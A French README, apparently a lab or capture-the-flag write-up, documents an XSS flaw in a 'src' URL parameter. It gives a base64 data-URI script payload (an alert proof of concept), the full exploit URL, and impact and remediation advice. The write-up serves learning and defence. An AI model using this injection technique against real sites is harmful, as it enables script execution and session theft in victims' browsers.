# README : Exploit d'Injection Script XSS via URL

## Description

Cette brèche met en évidence une vulnérabilité de Cross-Site Scripting (XSS) dans une application web. Elle permet à un attaquant potentiel d'exécuter du code JavaScript malveillant en injectant des scripts dans l'URL.

## Fonctionnement

- Cliquez sur l'image de la NSA pour atteindre : `http://X.X.X.X/?page=media&src=nsa`
- Creez un script en base64 : `https://www.base64encode.org/fr/`

```html
<script>
  alert("XSS" + new Date().getTime());
</script>
== PHNjcmlwdD5hbGVydCgiWFNTIiArIG5ldyBEYXRlKCkuZ2V0VGltZSgpKTs8L3NjcmlwdD4=
```

- Remplacez le contenu après `src=` par le script XSS en base64, en ajoutant les URI adaptées :
  `src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyArIG5ldyBEYXRlKCkuZ2V0VGltZSgpKTs8L3NjcmlwdD4=`

**Type de donnees URI (Uniform Resource Identifier) :** `data:text/html;base64,`  
Type URI, pour ajouter des donnees dans le code HTML.  
**data** = schema qui indique que les **données sont incluses** dans l’URI  
**text/html** = **type MIME** qui indique que c’est du HTML  
**base64** = encode en base64, format classique pour encode des donnees binaires en text ASCII

- Accédez à l'URL :  
   `http://X.X.X.X/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyArIG5ldyBEYXRlKCkuZ2V0VGltZSgpKTs8L3NjcmlwdD4=`

## Impact

Cette vulnérabilité peut permettre à un attaquant de :

- Exécuter du code JavaScript dans le navigateur de l'utilisateur
- Potentiellement voler les informations de session utilisateur
- Afficher du contenu malveillant aux utilisateurs légitimes

## Recommandations

Pour corriger cette vulnérabilité :

- Valider et sécuriser toutes les entrées utilisateur côté serveur avant de les utiliser dans l'URL.
- Utiliser une validation robuste pour empêcher l'injection de script HTML ou JavaScript.
- Implémenter une protection anti-XSS pour éviter l'exécution de code malveillant dans le navigateur.
- Utiliser le schéma correct pour les données dans l'URL (`data:`) et valider son contenu.
